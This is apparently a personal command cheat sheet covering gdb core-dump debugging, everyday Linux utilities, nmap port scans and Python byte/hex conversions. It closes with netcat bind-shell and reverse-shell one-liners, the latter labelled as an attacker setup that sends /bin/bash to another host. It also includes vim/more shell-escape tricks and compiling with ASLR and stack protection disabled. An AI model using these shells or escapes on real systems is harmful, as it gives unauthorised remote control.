# Debugging with dgb on focal fossa

```bash
# Set limit of core dump as unlimited and show
ulimit -S -c unlimited
ulimit -c

# OR set limit of core dump permanently
sudo vi /etc/security/limits.conf
# * soft core unlimited

# Open core dump with gdb
gdb ./app /var/lib/apport/coredump/core._path_to_app.whatever

# Disassemble on gdb
# disass main
# disass foo_function
```

# Some utils commands

```bash
# Format JSON file
cat file.json | jq

# Extract zlib on ubuntu
zlib-flate -uncompress < file.zlib > file

# See diference between two file with vim
vimdiff hdfile1 hdfile2

# Find type of file inside a binary
binwalk file.bin

# Compile C program without "stack smashing detected"
echo "0" > /proc/sys/kernel/randomize_va_space
gcc -m32 -zexecstack -fno-stack-protector -g -o app app.c

# Show information about an tag
git show mytag-v1.0-rc

# Gaining shell access with vim
# Type ":set shell=/bin/bash" and enter
# Type ":shell" and enter

# Gaining access to vim with more
# Press key v

# Generate sequence 0..10 with 0000 format
seq -f "%04g" 0 10

# Run a command and kill after some time
timeout -s 9 60 nc -l -p 3000

# See properties of an file
stat myfile

# Crontab File format manual
man 5 crontab

# Use netcat as a server
nc -l -p 3000

# Run ssh without execute .bashrc or .profile
ssh user@host -p 22 /bin/bash

# See diference between files
diff file.old file.new

# Scan for open ports and detect version
nmap -v -sV 192.168.1.4

# Scan for open ports and check if using SSL
nmap -p 31000-32000 --script ssl-enum-ciphers localhost

# Scan for open ports
nmap -p 31000-32000 localhost

# Connect to an server using SSL Encryption passing input data
openssl s_client -ign_eof -connect localhost:30001 <<< "some_data"

# Connect to an server using SSL Encryption
openssl s_client -connect localhost:30001

# Rot13 Caesar chiper with tr
tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< "Pass"

# get all strings of binary file
cat raw.bin | strings

# Find files by user, group and size
find / -size 33c -group root -user root

# Find files by size in bytes
find . -size 1033c

# Split vim [Use Ctrl+W to switch]
# :! execute a command
vim -O matrix.c matrix.py

# Display output of last program
echo  $?

# Compile C program
gcc matrix.c -o matrix -Wall

# C documentation
man 3 printf

# Get output and show in hexadecimal
echo hello | hexdump -C

# Show ASCII Table
man ascii
```
# Convert formats with python

```python
# String to Bytes
'José'.encode('utf-8') # Output: b'Jos\xc3\xa9'

# Bytes to Hex string
b'Jos\xc3\xa9'.hex() # Output: '4a6f73c3a9'

# Hex string to Bytes
bytes.fromhex('4a6f73c3a9') # Output: b'Jos\xc3\xa9'

# Bytes to String
b'Jos\xc3\xa9'.decode('utf-8') # Output: José
```

# Bind shell connection

```bash
# Server machine
nc -lp 8080 -e /bin/bash
```

# Reverse shell connection

```bash
# Attacker machine
nc -lp 8080
# Server machine
nc 192.168.1.3 -e /bin/bash
```
